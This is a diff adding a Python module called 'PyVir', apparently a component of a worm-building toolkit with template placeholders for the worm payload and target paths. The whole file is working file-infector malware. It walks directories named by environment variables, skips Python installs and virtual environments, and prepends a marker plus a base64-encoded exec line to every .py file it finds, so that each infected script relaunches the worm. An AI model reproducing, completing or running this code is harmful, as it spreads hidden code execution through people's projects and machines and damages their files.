@@ -1,0 +1,68 @@
+#!name##PyVir
+#!types##starter
+#!info##It does not run the worm directly. It searches for ‘py’ files and writes worm code to them. Each time the ‘py’ file is run, it will launch the worm
+#!reqVar##_WORM_CODE##Worm code. This variable will add itself automatically.
+#!reqFood##FOOD_system_path##FOOD_system_path##List of paths to various directories.
+
+import os
+import threading
+import sys
+import base64
+
+class PyVir:
+    def __init__(self):
+        self.id = "#$$$$$$!!!!!!!!\n"
+        self.code = "import base64\nexec(base64.b64decode({{_WORM_CODE}}).decode('utf-8'))"
+        self.raw_dirs = {{FOOD_system_path}}
+        self.start_dirs = []
+        self.lock = threading.Lock()
+    
+    def initialize(self) -> None:
+        for raw in self.raw_dirs:
+            try:
+                env = os.environ[raw]
+            except:
+                continue
+            if env:
+                self.start_dirs.append(env)
+    
+    def inject_code(self, target_file: str) -> None:
+        with self.lock:
+            try:
+                with open(target_file, "r") as file:
+                    if file.readlines()[0] == self.id:
+                        return
+                    file.seek(0)
+                    temp = file.read()
+            except:
+                return
+            try:
+                with open(target_file, "w") as file:
+                    file.write(self.id + str(self.code) + "\n" + temp)
+            except:
+                pass
+    
+    def _find_victims(self, dir_name: str) -> None:
+        for root, dirs, files in os.walk(dir_name):
+            if sys.prefix in root:
+                continue
+            if "Lib" in root or "venv" in root:
+                continue
+            if "site-packages" in root:
+                continue
+            for f in files:
+                if os.path.splitext(f)[-1] == ".py":
+                    self.inject_code(os.path.join(root, f))
+    
+    def find_victims(self):
+        for sd in self.start_dirs:
+            inject = threading.Thread(target=self._find_victims, args=(sd,))
+            inject.start()
+    
+    def Run(self) -> None:
+        self.initialize()
+        self.find_victims()
+
+if __name__ == "__main__":
+    pyvir = PyVir()
+    pyvir.Run()
